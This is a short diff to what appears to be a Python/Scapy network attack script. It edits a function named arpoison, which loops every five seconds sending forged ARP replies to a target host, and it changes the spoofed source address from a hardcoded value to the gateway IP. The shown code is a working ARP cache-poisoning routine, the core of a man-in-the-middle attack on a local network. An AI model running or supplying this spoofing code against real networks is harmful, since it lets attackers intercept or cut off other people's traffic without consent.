@@ -204,7 +204,7 @@ def save(list):
 def arpoison(trg_ip,trg_mac,gw_ip):
 	global deader
 	while deader==False:
-		send((ARP(op = 2, pdst = trg_ip, psrc = '192.168.0.254', hwdst= trg_mac)),verbose = False)
+		send((ARP(op = 2, pdst = trg_ip, psrc = gw_ip, hwdst= trg_mac)),verbose = False)
 		time.sleep(5)
 
 def main(debug = False):
